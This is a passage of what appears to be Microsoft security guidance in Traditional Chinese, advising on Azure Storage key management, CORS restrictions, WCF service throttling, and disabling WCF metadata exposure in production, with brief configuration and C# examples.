| **參考**              | [Azure 儲存體安全性指南 - 管理儲存體帳戶金鑰](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **步驟** | <p>金鑰儲存體︰建議將 Azure Key Vault 中的 Azure 儲存體存取金鑰儲存為密碼，並且讓應用程式從 Key Vault 擷取金鑰。 此建議的原因如下︰</p><ul><li>應用程式永遠都不需要將儲存體金鑰硬式編碼於組態檔中，這樣會移除某人不需特定權限即可存取金鑰的途徑</li><li>可以使用 Azure Active Directory 控制金鑰的存取。 這表示帳戶擁有者可以將存取權授予少數需要從 Azure Key Vault 擷取金鑰的應用程式。 若未特別授與權限，其他應用程式將無法存取金鑰</li><li>重新產生金鑰︰基於安全性考量，建議施行相關程序來重新產生 Azure 儲存體存取金鑰。 Azure 儲存體安全性指南參考文章會記載有關為何及如何規劃重新產生金鑰的詳細資訊</li></ul>|

## <a id="cors-storage"></a>確保在 Azure 儲存體上啟用 CORS 的情況下只允許信任的來源

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Azure 儲存體 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [Azure 儲存體服務的 CORS 支援](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **步驟** | Azure 儲存體可讓您啟用 CORS – 跨原始來源資源共用。 對於每個儲存體帳戶，您可以指定可存取該儲存體帳戶中之資源的網域。 根據預設，所有服務上都會停用 CORS。 您可以使用 REST API 或儲存體用戶端程式庫，呼叫其中一個方法來設定服務原則，藉以啟用 CORS。 |

## <a id="throttling"></a>啟用 WCF 的服務節流功能

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | WCF | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | .NET Framework 3 |
| **屬性**              | N/A  |
| **參考**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx)、[Fortify Kingdom](https://vulncat.fortify.com) |
| **步驟** | <p>未設定系統資源的使用限制，可能會導致資源耗盡，而最後導致拒絕服務。</p><ul><li>**說明︰** Windows Communication Foundation (WCF) 提供服務要求節流的功能。 允許太多的用戶端要求可能會淹沒系統及耗盡其資源。 另一方面，只允許服務有少數要求可防止合法使用者使用此服務。 每項服務應個別調整並設定為允許適當的資源數量。</li><li>**建議** 啟用 WCF 的服務節流功能以及為應用程式設定適當的限制。</li></ul>|

### <a name="example"></a>範例
下列是已啟用節流的範例組態︰
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF-透過中繼資料的資訊洩漏

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | WCF | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | .NET Framework 3 |
| **屬性**              | N/A  |
| **參考**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx)、[Fortify Kingdom](https://vulncat.fortify.com) |
| **步驟** | 中繼資料可協助攻擊者了解系統及規劃攻擊形式。 可以將 WCF 服務設定為公開中繼資料。 中繼資料可提供詳細的服務描述資訊，且不得在生產環境中廣播。 ServiceMetaData 類別的 `HttpGetEnabled` / `HttpsGetEnabled` 屬性會定義服務是否會公開中繼資料 | 

### <a name="example"></a>範例
下列程式碼會指示 WCF 廣播服務的中繼資料
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
不要在生產環境中廣播服務中繼資料。 將 ServiceMetaData 類別的 HttpGetEnabled / HttpsGetEnabled 屬性設定為 false。 

### <a name="example"></a>範例
下列程式碼會指示 WCF 不要廣播服務的中繼資料。 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
